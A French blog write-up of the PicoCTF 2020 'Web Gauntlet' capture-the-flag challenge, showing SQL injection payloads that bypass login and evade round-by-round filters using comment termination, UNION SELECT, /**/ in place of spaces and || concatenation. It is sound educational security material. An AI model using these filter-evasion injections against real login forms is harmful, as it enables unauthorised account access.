---
layout: post
title: PicoCTF 2020 - Bypass de filtres SQL
subtitle: PicoCTF - Web Gauntlet - Web exploitation - SQLi 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [CTF, PicoCTF, Web Gauntlet, Bypass, SQL filters, SQLi, Write-Up]
comments: false
---

![Logo](/img/PicoCTF_logo.png){: .center-block :}

Web Gauntlet est un chall d'exploitation web proposé lors de la version 2020 de PicoCTF. Il s'agit d'un challenge plutôt classique où le but est de se loguer en tant qu'admin à l'aide d'injections SQL. Jusque là rien de bien nouveau... L'originalité de Web Gauntlet est toutefois qu'il faudra bypasser des filtres qui sont ajoutés à chaque niveau du chall pour complexifier les SQLi. 

![Description](/img/PicoCTF_1.png){: .center-block :}

![Sign In](/img/PicoCTF_2.png){: .center-block :}

Test avec `admin::admin`

![Test](/img/PicoCTF_3.png){: .center-block :}

`SELECT * FROM users WHERE username='admin' AND password='admin'`

Ref: [PayloadsAllTheThings - SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Round 1

![Round1](/img/PicoCTF_4.png){: .center-block :}

Pour le ‘Round 1’ on ne peut pas utiliser ‘or’...

**Payload:** 

Username: `admin';-- test` 
Password: `test`

`SELECT * FROM users WHERE username='admin';-- test' AND password='test'`

{: .box-note}
; : ferme la requête
-- : ce qui est après est un commentaire

{: .box-warning}
Remarque: Pas d'espace avant l'appel au commentaire sinon bloque car considéré comme white space voir plus bas round 4

![Round1](/img/PicoCTF_5.png){: .center-block :}

## Round 2

![Round2](/img/PicoCTF_6.png){: .center-block :}

**Payload:** 

Username: `admin';` 
Password: `test`

`SELECT * FROM users WHERE username='admin';' AND password='test'`

![Round2](/img/PicoCTF_7.png){: .center-block :}

## Round 3

![Round3](/img/PicoCTF_8.png){: .center-block :}

Ça change rien, on utilise aucun de ces symboles :)

**Payload:**

Username: `admin';`
Password: `test`

SELECT * FROM users WHERE username='admin';' AND password='test'

![Round3](/img/PicoCTF_9.png){: .center-block :}

## Round 4

![Round4](/img/PicoCTF_10.png){: .center-block :}

On ne peut plus utiliser `admin`...

En général le premier utilisateur dans la table est admin

~~~
1 admin password
2 user1 password1
...
~~~

**Payload:**

Username: `bob' UNION SELECT * FROM users LIMIT 1;`
Password: `test`

`SELECT * FROM users WHERE username='bob' UNION SELECT * FROM users LIMIT 1;' AND password='test'`

{: .box-note}
LIMIT 1 limite au premier résultat

Ne fonctionne pas car contient des whitespace :(

on peut utiliser `/**/` à la place des espaces ce qui donne le payload suivant

**Paylod:**

`bob'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;`   

Ref: 
- [SQL injection bypassing common filters - Portswigger](https://portswigger.net/support/sql-injection-bypassing-common-filters)
- [SQL Injection Bypassing WAF - OWASP](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

`SELECT * FROM users WHERE username='bob'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;' AND password='bob'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;'`     

![Round4](/img/PicoCTF_11.png){: .center-block :}

## Round 5

![Round5](/img/PicoCTF_12.png){: .center-block :}

'The double-pipe sequence || is a string concatenation operator on Oracle.'

Ref: [SQL injection - Union attacks - Portswigger](https://portswigger.net/web-security/sql-injection/union-attacks)

**Payload:** `adm'||'in';`

![Round5](/img/PicoCTF_13.png){: .center-block :}

**Poursuivez avec :** 

[- VulnHub - BossPlayersCTF](https://0xss0rz.github.io/2020-11-16-Vulnhub-BossPLayersCTF/)

[- Hack The Box - Cache](https://0xss0rz.github.io/2020-11-18-HTB-Cache/)

[- PicoCTF 2018 - Web Application](https://0xss0rz.github.io/2019-08-24-picoCTF-Web-Application-Write-Ups/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
